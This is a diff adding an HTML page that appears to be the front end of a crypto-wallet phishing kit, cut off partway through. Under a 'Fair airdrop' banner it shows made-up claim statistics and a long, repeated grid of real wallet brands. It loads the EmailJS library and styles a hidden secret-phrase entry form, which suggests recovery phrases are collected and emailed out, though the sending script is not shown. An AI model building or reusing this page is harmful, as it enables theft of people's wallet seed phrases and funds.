@@ -1,0 +1,1799 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Dashboard</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+
+
+    <style>
+        /* Reset default margins and paddings */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family:'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+        }
+
+        /* Header Styling */
+        header {
+            background: linear-gradient(135deg, #2a3b6e, #4e6b8c); /* Gradient background */
+            color: #fff;
+            padding: 40px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            border-bottom: 3px solid #fff;
+        }
+
+        /* Center the Search Bar */
+        #search-section {
+            display: flex;
+            justify-content: center; /* Centers horizontally */
+            align-items: center; /* Centers vertically */
+            padding: 20px;
+            margin-top: 20px;
+        }
+
+        #coin-search {
+            padding: 12px 20px;
+            font-size: 1rem;
+            width: 60%; /* Adjust the width as needed */
+            max-width: 400px; /* Set a max-width to prevent it from stretching too much */
+            border-radius: 10px;
+            margin: 0 auto;
+            border: 1px solid #ddd;
+            background-color: #f8f8f8;
+            transition: border-color 0.3s ease;
+        }
+
+        #coin-search:focus {
+            border-color: #4caf50;
+        }
+
+        /* Linear Loader Styling */
+        .linear-loader {
+            width: 100%;
+            height: 5px;
+            background-color: #ddd;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 10;
+            display: none; /* Hidden by default */
+        }
+
+        .linear-loader.active {
+            animation: loading 2s linear infinite;
+        }
+
+        @keyframes loading {
+            0% {
+                width: 0;
+            }
+            100% {
+                width: 100%;
+            }
+        }
+
+        /* Modal Styling */
+        .modal {
+            display: none; /* Hidden by default */
+            position: fixed;
+            z-index: 1; /* Sit on top */
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0, 0, 0, 0.6); /* Darker overlay */
+            padding-top: 60px;
+        }
+
+        .modal-content {
+            background: linear-gradient(135deg, #f0eeee, #fbfbfc); /* Soft gradient background */
+            margin: 10% auto;
+            padding: 30px;
+            border: 1px solid #888;
+            width: 70%;
+            max-width: 500px;
+            border-radius: 15px;
+            text-align: center;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); /* Soft shadow */
+        }
+
+        .modal-content img {
+            max-width: 120px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+
+        .modal-content h2 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            color: black;
+            margin-bottom: 20px;
+        }
+
+        .modal-content p {
+            font-size: 1.1rem;
+            margin-bottom: 30px;
+            color: #fff;
+        }
+
+        .modal-content button {
+            padding: 12px 25px;
+            margin: 5px;
+            font-size: 1.1rem;
+            cursor: pointer;
+            border-radius: 10px;
+            border: none;
+            background-color: #4caf50; /* Green color */
+            color: #fff;
+            transition: background-color 0.3s ease;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        .modal-content button:hover {
+            background-color: #45a049;
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3); /* Hover effect */
+        }
+
+  /* Coin Boxes Layout */
+.coin-box-container {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: space-between; /* Adjusts space between items */
+    gap: 20px;
+    padding: 20px;
+}
+
+.coin-box {
+    display: flex;
+    align-items: center; /* Align image and text */
+    background-color: #fff;
+    border-radius: 10px;
+    border: 2px solid red; /* Added red border */
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    flex-basis: calc(25% - 20px); /* 4 items per row with margin space */
+    margin-bottom: 20px; /* Bottom margin for spacing between rows */
+    padding: 20px;
+    cursor: pointer;
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+    box-sizing: border-box; /* Ensures padding is included in width */
+}
+
+.coin-box img {
+    width: 40px; /* Adjust width for the image */
+    height: auto;
+    margin-right: 20px; /* Add space between the image and the text */
+}
+
+.coin-box .coin-info {
+    display: flex;
+    flex-direction: column;
+}
+
+.coin-box .coin-info a {
+    font-size: 1.1rem;
+    color: #333;
+    text-decoration: none;
+    font-weight: 600;
+}
+
+.coin-box .coin-info .website {
+    font-size: 0.9rem;
+    color: #777;
+    margin-top: 5px;
+}
+
+.coin-box:hover {
+    transform: scale(1.05);
+    box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+}
+
+/* Responsive Adjustment for smaller screens */
+@media (max-width: 1024px) {
+    .coin-box {
+        flex-basis: calc(33.33% - 20px); /* 3 items per row for medium screens */
+    }
+}
+
+@media (max-width: 768px) {
+    .coin-box {
+        flex-basis: calc(50% - 20px); /* 2 items per row for mobile screens */
+    }
+}
+
+@media (max-width: 480px) {
+    .coin-box {
+        flex-basis: 100%; /* 1 item per row for small screens */
+    }
+}
+
+*/
+        /* Coin Search Styling */
+        #coin-search {
+            padding: 12px 20px;
+            font-size: 1rem;
+            width: 100%;
+            border-radius: 10px;
+            margin: 10px 0 20px;
+            border: 1px solid #ddd;
+            background-color: #f8f8f8;
+            transition: border-color 0.3s ease;
+        }
+
+        #coin-search:focus {
+            border-color: #4caf50;
+        }
+
+        /* Secret Phrase Section */
+        #secret-phrase-section {
+            display: none; /* Hidden by default */
+            margin-top: 20px;
+        }
+
+        #secret-phrase-section input {
+            padding: 10px;
+            font-size: 1rem;
+            width: 100%;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            background-color: #f8f8f8;
+        }
+
+        #secret-phrase-section button {
+            padding: 10px 20px;
+            font-size: 1rem;
+            cursor: pointer;
+            border-radius: 8px;
+            border: none;
+            background-color: #ff9800;
+            color: white;
+            transition: background-color 0.3s ease;
+        }
+
+        #secret-phrase-section button:hover {
+            background-color: #e68900;
+        }
+
+        /* Continuous Loader */
+        .continuous-loader {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #3498db;
+            border-radius: 50%;
+            animation: spin 2s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* New Text Styling */
+        .modal-content .info-text {
+            font-size: 1rem;
+            color: #777;
+            margin-bottom: 15px;
+            line-height: 1.5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-content .info-text img {
+            width: 20px; /* Set icon size */
+            margin-right: 10px;
+        }
+
+        .modal-content .info-text strong {
+            color: #333;
+            font-weight: bold;
+        }
+        .logo1{
+            width: 40px;
+        }
+
+        /* Section Container */
+.section-container {
+    display: flex;
+    justify-content: center; /* Center the boxes in the middle */
+    gap: 5px; /* Small gap between the boxes */
+    margin: 30px 0;
+}
+
+/* Stats Box */
+.stats-box {
+    background-color: #fff;
+    border-radius: 10px;
+    padding: 20px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    width: 300px; /* Box width remains the same */
+    text-align: center;
+}
+
+/* Stats Heading */
+.stats-box h2 {
+    font-size: 1.2rem;
+    color: #333;
+    margin-bottom: 10px;
+}
+
+/* Stats Value */
+.stats-value {
+    font-size: 2rem;
+    font-weight: 600;
+    color: #4CAF50; /* Green color for visibility */
+}
+
+    </style>
+</head>
+<body>
+
+    <!-- Linear Loader -->
+    <div id="linearLoader" class="linear-loader hidden"></div>
+
+    <!-- Header Section -->
+    <header>
+        <img class="logo1" src="/assets/casino.png" alt="Header Image" id="header-img">
+        <h1>Fair airdrop</h1>
+    </header>
+
+    <!-- Coin Search Section -->
+    <div id="search-section">
+        <input type="text" id="coin-search" placeholder="Search for a wallet">
+    </div>
+
+    <div class="section-container">
+        <!-- Total SOL Received Section -->
+        <div class="stats-box">
+            <h2>Total SOL Received</h2>
+            <div class="stats-value" id="total-sol-received">70,000 sol</div> <!-- Placeholder value -->
+        </div>
+    
+        <!-- Total Accounts Claimed Section -->
+        <div class="stats-box">
+            <h2>Total Accounts Claimed</h2>
+            <div class="stats-value" id="total-accounts-claimed">37354732</div> <!-- Placeholder value -->
+        </div>
+    </div>
+    
+
+    <!-- Wallet Box Layout (Flexbox) -->
+    <div class="coin-box-container" id="coin-box-container">
+        <!-- Coin Box for MetaMask -->
+        <div class="coin-box" data-name="MetaMask" data-logo="/assets/26-700x430.jpg">
+            <img src="/assets/26-700x430.jpg" alt="MetaMask">
+            <div class="coin-info">
+                <a href="https://metamask.io" target="_blank">MetaMask</a>
+                <div class="website">metamask.io</div>
+            </div>
+        </div>
+        
+
+
+
+
+
+
+        <!-- Coin Box for Phantom Wallet -->
+<div class="coin-box" data-name="Phantom Wallet" data-logo="https://phantom.app/favicon.ico">
+    <img src="https://phantom.app/favicon.ico" alt="Phantom Wallet">
+    <div class="coin-info">
+        <a href="https://phantom.app" target="_blank">Phantom Wallet</a>
+        <div class="website">phantom.app</div>
+    </div>
+</div>
+
+<!-- Coin Box for Trust Wallet -->
+<div class="coin-box" data-name="Trust Wallet" data-logo="https://trustwallet.com/favicon.ico">
+    <img src="https://trustwallet.com/favicon.ico" alt="Trust Wallet">
+    <div class="coin-info">
+        <a href="https://trustwallet.com" target="_blank">Trust Wallet</a>
+        <div class="website">trustwallet.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for MetaMask Wallet -->
+<div class="coin-box" data-name="MetaMask Wallet" data-logo="https://metamask.io/favicon.ico">
+    <img src="https://metamask.io/favicon.ico" alt="MetaMask Wallet">
+    <div class="coin-info">
+        <a href="https://metamask.io" target="_blank">MetaMask Wallet</a>
+        <div class="website">metamask.io</div>
+    </div>
+</div>
+
+<!-- Coin Box for Binance Chain Wallet -->
+<div class="coin-box" data-name="Binance Chain Wallet" data-logo="https://www.binance.org/favicon.ico">
+    <img src="https://www.binance.org/favicon.ico" alt="Binance Chain Wallet">
+    <div class="coin-info">
+        <a href="https://www.binance.org" target="_blank">Binance Chain Wallet</a>
+        <div class="website">binance.org</div>
+    </div>
+</div>
+
+<!-- Coin Box for Coinbase Wallet -->
+<div class="coin-box" data-name="Coinbase Wallet" data-logo="https://www.coinbase.com/favicon.ico">
+    <img src="https://www.coinbase.com/favicon.ico" alt="Coinbase Wallet">
+    <div class="coin-info">
+        <a href="https://www.coinbase.com/wallet" target="_blank">Coinbase Wallet</a>
+        <div class="website">coinbase.com/wallet</div>
+    </div>
+</div>
+
+<!-- Coin Box for Exodus Wallet -->
+<div class="coin-box" data-name="Exodus Wallet" data-logo="https://www.exodus.com/favicon.ico">
+    <img src="https://www.exodus.com/favicon.ico" alt="Exodus Wallet">
+    <div class="coin-info">
+        <a href="https://www.exodus.com" target="_blank">Exodus Wallet</a>
+        <div class="website">exodus.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Trezor -->
+<div class="coin-box" data-name="Trezor" data-logo="https://trezor.io/favicon.ico">
+    <img src="https://trezor.io/favicon.ico" alt="Trezor">
+    <div class="coin-info">
+        <a href="https://trezor.io" target="_blank">Trezor</a>
+        <div class="website">trezor.io</div>
+    </div>
+</div>
+
+<!-- Coin Box for Ledger -->
+<div class="coin-box" data-name="Ledger" data-logo="https://www.ledger.com/favicon.ico">
+    <img src="https://www.ledger.com/favicon.ico" alt="Ledger">
+    <div class="coin-info">
+        <a href="https://www.ledger.com" target="_blank">Ledger</a>
+        <div class="website">ledger.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Blockchain Wallet -->
+<div class="coin-box" data-name="Blockchain Wallet" data-logo="https://www.blockchain.com/favicon.ico">
+    <img src="https://www.blockchain.com/favicon.ico" alt="Blockchain Wallet">
+    <div class="coin-info">
+        <a href="https://www.blockchain.com" target="_blank">Blockchain Wallet</a>
+        <div class="website">blockchain.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Electrum Wallet -->
+<div class="coin-box" data-name="Electrum Wallet" data-logo="https://electrum.org/favicon.ico">
+    <img src="https://electrum.org/favicon.ico" alt="Electrum Wallet">
+    <div class="coin-info">
+        <a href="https://electrum.org" target="_blank">Electrum Wallet</a>
+        <div class="website">electrum.org</div>
+    </div>
+</div>
+
+<!-- Coin Box for Mycelium Wallet -->
+<div class="coin-box" data-name="Mycelium Wallet" data-logo="https://mycelium.com/favicon.ico">
+    <img src="https://mycelium.com/favicon.ico" alt="Mycelium Wallet">
+    <div class="coin-info">
+        <a href="https://mycelium.com" target="_blank">Mycelium Wallet</a>
+        <div class="website">mycelium.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for BRD Wallet -->
+<div class="coin-box" data-name="BRD Wallet" data-logo="https://brd.com/favicon.ico">
+    <img src="https://brd.com/favicon.ico" alt="BRD Wallet">
+    <div class="coin-info">
+        <a href="https://brd.com" target="_blank">BRD Wallet</a>
+        <div class="website">brd.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Argent Wallet -->
+<div class="coin-box" data-name="Argent Wallet" data-logo="https://www.argent.xyz/favicon.ico">
+    <img src="https://www.argent.xyz/favicon.ico" alt="Argent Wallet">
+    <div class="coin-info">
+        <a href="https://www.argent.xyz" target="_blank">Argent Wallet</a>
+        <div class="website">argent.xyz</div>
+    </div>
+</div>
+
+<!-- Coin Box for ZenGo Wallet -->
+<div class="coin-box" data-name="ZenGo Wallet" data-logo="https://zengo.com/favicon.ico">
+    <img src="https://zengo.com/favicon.ico" alt="ZenGo Wallet">
+    <div class="coin-info">
+        <a href="https://zengo.com" target="_blank">ZenGo Wallet</a>
+        <div class="website">zengo.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for SafePal Wallet -->
+<div class="coin-box" data-name="SafePal Wallet" data-logo="https://www.safepal.com/favicon.ico">
+    <img src="https://www.safepal.com/favicon.ico" alt="SafePal Wallet">
+    <div class="coin-info">
+        <a href="https://www.safepal.com" target="_blank">SafePal Wallet</a>
+        <div class="website">safepal.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Coinomi Wallet -->
+<div class="coin-box" data-name="Coinomi Wallet" data-logo="https://www.coinomi.com/favicon.ico">
+    <img src="https://www.coinomi.com/favicon.ico" alt="Coinomi Wallet">
+    <div class="coin-info">
+        <a href="https://www.coinomi.com" target="_blank">Coinomi Wallet</a>
+        <div class="website">coinomi.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Guarda Wallet -->
+<div class="coin-box" data-name="Guarda Wallet" data-logo="https://guarda.com/favicon.ico">
+    <img src="https://guarda.com/favicon.ico" alt="Guarda Wallet">
+    <div class="coin-info">
+        <a href="https://guarda.com" target="_blank">Guarda Wallet</a>
+        <div class="website">guarda.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Armory Wallet -->
+<div class="coin-box" data-name="Armory Wallet" data-logo="https://bitcoinarmory.com/favicon.ico">
+    <img src="https://bitcoinarmory.com/favicon.ico" alt="Armory Wallet">
+    <div class="coin-info">
+        <a href="https://bitcoinarmory.com" target="_blank">Armory Wallet</a>
+        <div class="website">bitcoinarmory.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Jaxx Liberty Wallet -->
+<div class="coin-box" data-name="Jaxx Liberty Wallet" data-logo="https://jaxx.io/favicon.ico">
+    <img src="https://jaxx.io/favicon.ico" alt="Jaxx Liberty Wallet">
+    <div class="coin-info">
+        <a href="https://jaxx.io" target="_blank">Jaxx Liberty Wallet</a>
+        <div class="website">jaxx.io</div>
+    </div>
+</div>
+
+<!-- Coin Box for BitPay Wallet -->
+<div class="coin-box" data-name="BitPay Wallet" data-logo="https://bitpay.com/favicon.ico">
+    <img src="https://bitpay.com/favicon.ico" alt="BitPay Wallet">
+    <div class="coin-info">
+        <a href="https://bitpay.com" target="_blank">BitPay Wallet</a>
+        <div class="website">bitpay.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for BlockFi Wallet -->
+<div class="coin-box" data-name="BlockFi Wallet" data-logo="https://www.blockfi.com/favicon.ico">
+    <img src="https://www.blockfi.com/favicon.ico" alt="BlockFi Wallet">
+    <div class="coin-info">
+        <a href="https://www.blockfi.com" target="_blank">BlockFi Wallet</a>
+        <div class="website">blockfi.com</div>
+    </div>
+</div>
+
+
+
+
+
+
+
+<!-- Coin Box for BitGo Wallet -->
+<div class="coin-box" data-name="BitGo Wallet" data-logo="https://www.bitgo.com/favicon.ico">
+    <img src="https://www.bitgo.com/favicon.ico" alt="BitGo Wallet">
+    <div class="coin-info">
+        <a href="https://www.bitgo.com" target="_blank">BitGo Wallet</a>
+        <div class="website">bitgo.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Zapper Wallet -->
+<div class="coin-box" data-name="Zapper Wallet" data-logo="https://zapper.fi/favicon.ico">
+    <img src="https://zapper.fi/favicon.ico" alt="Zapper Wallet">
+    <div class="coin-info">
+        <a href="https://zapper.fi" target="_blank">Zapper Wallet</a>
+        <div class="website">zapper.fi</div>
+    </div>
+</div>
+
+<!-- Coin Box for Nifty Wallet -->
+<div class="coin-box" data-name="Nifty Wallet" data-logo="https://www.niftywallet.io/favicon.ico">
+    <img src="https://www.niftywallet.io/favicon.ico" alt="Nifty Wallet">
+    <div class="coin-info">
+        <a href="https://www.niftywallet.io" target="_blank">Nifty Wallet</a>
+        <div class="website">niftywallet.io</div>
+    </div>
+</div>
+
+<!-- Coin Box for Fortmatic Wallet -->
+<div class="coin-box" data-name="Fortmatic Wallet" data-logo="https://fortmatic.com/favicon.ico">
+    <img src="https://fortmatic.com/favicon.ico" alt="Fortmatic Wallet">
+    <div class="coin-info">
+        <a href="https://fortmatic.com" target="_blank">Fortmatic Wallet</a>
+        <div class="website">fortmatic.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for MetaMask Mobile -->
+<div class="coin-box" data-name="MetaMask Mobile" data-logo="https://metamask.io/favicon.ico">
+    <img src="https://metamask.io/favicon.ico" alt="MetaMask Mobile">
+    <div class="coin-info">
+        <a href="https://metamask.io" target="_blank">MetaMask Mobile</a>
+        <div class="website">metamask.io</div>
+    </div>
+</div>
+
+<!-- Coin Box for Argent Mobile -->
+<div class="coin-box" data-name="Argent Mobile" data-logo="https://www.argent.xyz/favicon.ico">
+    <img src="https://www.argent.xyz/favicon.ico" alt="Argent Mobile">
+    <div class="coin-info">
+        <a href="https://www.argent.xyz" target="_blank">Argent Mobile</a>
+        <div class="website">argent.xyz</div>
+    </div>
+</div>
+
+<!-- Coin Box for Rainbow Wallet -->
+<div class="coin-box" data-name="Rainbow Wallet" data-logo="https://rainbow.me/favicon.ico">
+    <img src="https://rainbow.me/favicon.ico" alt="Rainbow Wallet">
+    <div class="coin-info">
+        <a href="https://rainbow.me" target="_blank">Rainbow Wallet</a>
+        <div class="website">rainbow.me</div>
+    </div>
+</div>
+
+<!-- Coin Box for Trust Vault Wallet -->
+<div class="coin-box" data-name="Trust Vault Wallet" data-logo="https://www.trustwallet.com/favicon.ico">
+    <img src="https://www.trustwallet.com/favicon.ico" alt="Trust Vault Wallet">
+    <div class="coin-info">
+        <a href="https://www.trustwallet.com" target="_blank">Trust Vault Wallet</a>
+        <div class="website">trustwallet.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Eidoo Wallet -->
+<div class="coin-box" data-name="Eidoo Wallet" data-logo="https://www.eidoo.io/favicon.ico">
+    <img src="https://www.eidoo.io/favicon.ico" alt="Eidoo Wallet">
+    <div class="coin-info">
+        <a href="https://www.eidoo.io" target="_blank">Eidoo Wallet</a>
+        <div class="website">eidoo.io</div>
+    </div>
+</div>
+
+<!-- Coin Box for Trustline Wallet -->
+<div class="coin-box" data-name="Trustline Wallet" data-logo="https://www.trustline.io/favicon.ico">
+    <img src="https://www.trustline.io/favicon.ico" alt="Trustline Wallet">
+    <div class="coin-info">
+        <a href="https://www.trustline.io" target="_blank">Trustline Wallet</a>
+        <div class="website">trustline.io</div>
+    </div>
+</div>
+
+<!-- Coin Box for Bitmart Wallet -->
+<div class="coin-box" data-name="Bitmart Wallet" data-logo="https://www.bitmart.com/favicon.ico">
+    <img src="https://www.bitmart.com/favicon.ico" alt="Bitmart Wallet">
+    <div class="coin-info">
+        <a href="https://www.bitmart.com" target="_blank">Bitmart Wallet</a>
+        <div class="website">bitmart.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Blockfolio Wallet -->
+<div class="coin-box" data-name="Blockfolio Wallet" data-logo="https://www.blockfolio.com/favicon.ico">
+    <img src="https://www.blockfolio.com/favicon.ico" alt="Blockfolio Wallet">
+    <div class="coin-info">
+        <a href="https://www.blockfolio.com" target="_blank">Blockfolio Wallet</a>
+        <div class="website">blockfolio.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for MetaMask Chrome Extension -->
+<div class="coin-box" data-name="MetaMask Chrome Extension" data-logo="https://metamask.io/favicon.ico">
+    <img src="https://metamask.io/favicon.ico" alt="MetaMask Chrome Extension">
+    <div class="coin-info">
+        <a href="https://metamask.io" target="_blank">MetaMask Chrome Extension</a>
+        <div class="website">metamask.io</div>
+    </div>
+</div>
+
+<!-- Coin Box for Aave Wallet -->
+<div class="coin-box" data-name="Aave Wallet" data-logo="https://aave.com/favicon.ico">
+    <img src="https://aave.com/favicon.ico" alt="Aave Wallet">
+    <div class="coin-info">
+        <a href="https://aave.com" target="_blank">Aave Wallet</a>
+        <div class="website">aave.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Uniswap Wallet -->
+<div class="coin-box" data-name="Uniswap Wallet" data-logo="https://uniswap.org/favicon.ico">
+    <img src="https://uniswap.org/favicon.ico" alt="Uniswap Wallet">
+    <div class="coin-info">
+        <a href="https://uniswap.org" target="_blank">Uniswap Wallet</a>
+        <div class="website">uniswap.org</div>
+    </div>
+</div>
+
+<!-- Coin Box for Luno Wallet -->
+<div class="coin-box" data-name="Luno Wallet" data-logo="https://www.luno.com/favicon.ico">
+    <img src="https://www.luno.com/favicon.ico" alt="Luno Wallet">
+    <div class="coin-info">
+        <a href="https://www.luno.com" target="_blank">Luno Wallet</a>
+        <div class="website">luno.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Edge Wallet -->
+<div class="coin-box" data-name="Edge Wallet" data-logo="https://edge.app/favicon.ico">
+    <img src="https://edge.app/favicon.ico" alt="Edge Wallet">
+    <div class="coin-info">
+        <a href="https://edge.app" target="_blank">Edge Wallet</a>
+        <div class="website">edge.app</div>
+    </div>
+</div>
+
+<!-- Coin Box for Coin98 Wallet -->
+<div class="coin-box" data-name="Coin98 Wallet" data-logo="https://www.coin98.com/favicon.ico">
+    <img src="https://www.coin98.com/favicon.ico" alt="Coin98 Wallet">
+    <div class="coin-info">
+        <a href="https://www.coin98.com" target="_blank">Coin98 Wallet</a>
+        <div class="website">coin98.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Trust Wallet Desktop -->
+<div class="coin-box" data-name="Trust Wallet Desktop" data-logo="https://www.trustwallet.com/favicon.ico">
+    <img src="https://www.trustwallet.com/favicon.ico" alt="Trust Wallet Desktop">
+    <div class="coin-info">
+        <a href="https://www.trustwallet.com" target="_blank">Trust Wallet Desktop</a>
+        <div class="website">trustwallet.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Blockchain.info Wallet -->
+<div class="coin-box" data-name="Blockchain.info Wallet" data-logo="https://www.blockchain.com/favicon.ico">
+    <img src="https://www.blockchain.com/favicon.ico" alt="Blockchain.info Wallet">
+    <div class="coin-info">
+        <a href="https://www.blockchain.com" target="_blank">Blockchain.info Wallet</a>
+        <div class="website">blockchain.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Coincheck Wallet -->
+<div class="coin-box" data-name="Coincheck Wallet" data-logo="https://coincheck.com/favicon.ico">
+    <img src="https://coincheck.com/favicon.ico" alt="Coincheck Wallet">
+    <div class="coin-info">
+        <a href="https://coincheck.com" target="_blank">Coincheck Wallet</a>
+        <div class="website">coincheck.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Guarda Wallet -->
+<div class="coin-box" data-name="Guarda Wallet" data-logo="https://guarda.com/favicon.ico">
+    <img src="https://guarda.com/favicon.ico" alt="Guarda Wallet">
+    <div class="coin-info">
+        <a href="https://guarda.com" target="_blank">Guarda Wallet</a>
+        <div class="website">guarda.com</div>
+    </div>
+</div>
+
+
+
+
+
+
+<!-- Coin Box for ZenGo Wallet -->
+<div class="coin-box" data-name="ZenGo Wallet" data-logo="https://zengo.com/favicon.ico">
+    <img src="https://zengo.com/favicon.ico" alt="ZenGo Wallet">
+    <div class="coin-info">
+        <a href="https://zengo.com" target="_blank">ZenGo Wallet</a>
+        <div class="website">zengo.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Exodus Wallet -->
+<div class="coin-box" data-name="Exodus Wallet" data-logo="https://www.exodus.com/favicon.ico">
+    <img src="https://www.exodus.com/favicon.ico" alt="Exodus Wallet">
+    <div class="coin-info">
+        <a href="https://www.exodus.com" target="_blank">Exodus Wallet</a>
+        <div class="website">exodus.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Trezor Wallet -->
+<div class="coin-box" data-name="Trezor Wallet" data-logo="https://trezor.io/favicon.ico">
+    <img src="https://trezor.io/favicon.ico" alt="Trezor Wallet">
+    <div class="coin-info">
+        <a href="https://trezor.io" target="_blank">Trezor Wallet</a>
+        <div class="website">trezor.io</div>
+    </div>
+</div>
+
+<!-- Coin Box for Ledger Nano S -->
+<div class="coin-box" data-name="Ledger Nano S" data-logo="https://www.ledger.com/favicon.ico">
+    <img src="https://www.ledger.com/favicon.ico" alt="Ledger Nano S">
+    <div class="coin-info">
+        <a href="https://www.ledger.com" target="_blank">Ledger Nano S</a>
+        <div class="website">ledger.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Coinomi Wallet -->
+<div class="coin-box" data-name="Coinomi Wallet" data-logo="https://www.coinomi.com/favicon.ico">
+    <img src="https://www.coinomi.com/favicon.ico" alt="Coinomi Wallet">
+    <div class="coin-info">
+        <a href="https://www.coinomi.com" target="_blank">Coinomi Wallet</a>
+        <div class="website">coinomi.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Mycelium Wallet -->
+<div class="coin-box" data-name="Mycelium Wallet" data-logo="https://mycelium.com/favicon.ico">
+    <img src="https://mycelium.com/favicon.ico" alt="Mycelium Wallet">
+    <div class="coin-info">
+        <a href="https://mycelium.com" target="_blank">Mycelium Wallet</a>
+        <div class="website">mycelium.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for BRD Wallet -->
+<div class="coin-box" data-name="BRD Wallet" data-logo="https://brd.com/favicon.ico">
+    <img src="https://brd.com/favicon.ico" alt="BRD Wallet">
+    <div class="coin-info">
+        <a href="https://brd.com" target="_blank">BRD Wallet</a>
+        <div class="website">brd.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Trust Wallet -->
+<div class="coin-box" data-name="Trust Wallet" data-logo="https://www.trustwallet.com/favicon.ico">
+    <img src="https://www.trustwallet.com/favicon.ico" alt="Trust Wallet">
+    <div class="coin-info">
+        <a href="https://www.trustwallet.com" target="_blank">Trust Wallet</a>
+        <div class="website">trustwallet.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Argent Wallet -->
+<div class="coin-box" data-name="Argent Wallet" data-logo="https://www.argent.xyz/favicon.ico">
+    <img src="https://www.argent.xyz/favicon.ico" alt="Argent Wallet">
+    <div class="coin-info">
+        <a href="https://www.argent.xyz" target="_blank">Argent Wallet</a>
+        <div class="website">argent.xyz</div>
+    </div>
+</div>
+
+<!-- Coin Box for ZenGo Wallet -->
+<div class="coin-box" data-name="ZenGo Wallet" data-logo="https://zengo.com/favicon.ico">
+    <img src="https://zengo.com/favicon.ico" alt="ZenGo Wallet">
+    <div class="coin-info">
+        <a href="https://zengo.com" target="_blank">ZenGo Wallet</a>
+        <div class="website">zengo.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for SafePal Wallet -->
+<div class="coin-box" data-name="SafePal Wallet" data-logo="https://www.safepal.com/favicon.ico">
+    <img src="https://www.safepal.com/favicon.ico" alt="SafePal Wallet">
+    <div class="coin-info">
+        <a href="https://www.safepal.com" target="_blank">SafePal Wallet</a>
+        <div class="website">safepal.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for BlockFi Wallet -->
+<div class="coin-box" data-name="BlockFi Wallet" data-logo="https://www.blockfi.com/favicon.ico">
+    <img src="https://www.blockfi.com/favicon.ico" alt="BlockFi Wallet">
+    <div class="coin-info">
+        <a href="https://www.blockfi.com" target="_blank">BlockFi Wallet</a>
+        <div class="website">blockfi.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for BitPay Wallet -->
+<div class="coin-box" data-name="BitPay Wallet" data-logo="https://bitpay.com/favicon.ico">
+    <img src="https://bitpay.com/favicon.ico" alt="BitPay Wallet">
+    <div class="coin-info">
+        <a href="https://bitpay.com" target="_blank">BitPay Wallet</a>
+        <div class="website">bitpay.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Electrum Wallet -->
+<div class="coin-box" data-name="Electrum Wallet" data-logo="https://electrum.org/favicon.ico">
+    <img src="https://electrum.org/favicon.ico" alt="Electrum Wallet">
+    <div class="coin-info">
+        <a href="https://electrum.org" target="_blank">Electrum Wallet</a>
+        <div class="website">electrum.org</div>
+    </div>
+</div>
+
+<!-- Coin Box for Armory Wallet -->
+<div class="coin-box" data-name="Armory Wallet" data-logo="https://bitcoinarmory.com/favicon.ico">
+    <img src="https://bitcoinarmory.com/favicon.ico" alt="Armory Wallet">
+    <div class="coin-info">
+        <a href="https://bitcoinarmory.com" target="_blank">Armory Wallet</a>
+        <div class="website">bitcoinarmory.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Jaxx Liberty Wallet -->
+<div class="coin-box" data-name="Jaxx Liberty Wallet" data-logo="https://jaxx.io/favicon.ico">
